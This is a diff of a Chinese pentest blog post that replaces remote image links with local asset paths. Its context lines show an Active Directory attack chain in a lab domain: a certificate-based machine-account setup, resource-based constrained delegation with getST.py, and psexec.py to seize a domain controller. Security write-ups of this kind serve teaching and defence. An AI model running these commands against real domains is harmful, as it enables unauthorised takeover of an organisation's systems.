@@ -258,7 +258,7 @@ public void Exploit()
 C:\Users\Marcus\Desktop> PassTheCertificate.exe -CertPath .\Administrator.pfx -CertPassword 123456 -MachineAccount PENTEST$ -MachinePassword Passw0rd -Target "CN=DC01,OU=Domain Controllers,DC=pentest,DC=com"
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013127977.png)
+![](/assets/posts/2023-02-28-pass-the-certificate-when-pkinit-is-nosupp/image-20230228013127977.png)
 
 此时，我们可以通过 Impacket 套件中的 getST.py 执行基于资源的约束性委派攻击，并获取用于访问 DC01 机器上 CIFS 服务的高权限票据，如图下所示。
 
@@ -266,7 +266,7 @@ C:\Users\Marcus\Desktop> PassTheCertificate.exe -CertPath .\Administrator.pfx -C
 python3 getST.py pentest.com/PENTEST\$:Passw0rd -spn CIFS/DC01.pentest.com -impersonate Administrator -dc-ip 172.26.10.11
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013417793.png)
+![](/assets/posts/2023-02-28-pass-the-certificate-when-pkinit-is-nosupp/image-20230228013417793.png)
 
 最后，通过设置环境变量 `KRB5CCNAME` 来使用该票据，并通过 psexec.py 获取域控制器的最高权限，如下图所示。
 
@@ -275,7 +275,7 @@ export KRB5CCNAME=Administrator.ccache
 python3 psexec.py -k pentest.com/Administrator@dc01.pentest.com -no-pass
 ```
 
-![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20230228013643492.png)
+![](/assets/posts/2023-02-28-pass-the-certificate-when-pkinit-is-nosupp/image-20230228013643492.png)
 
 ## Ending......
 
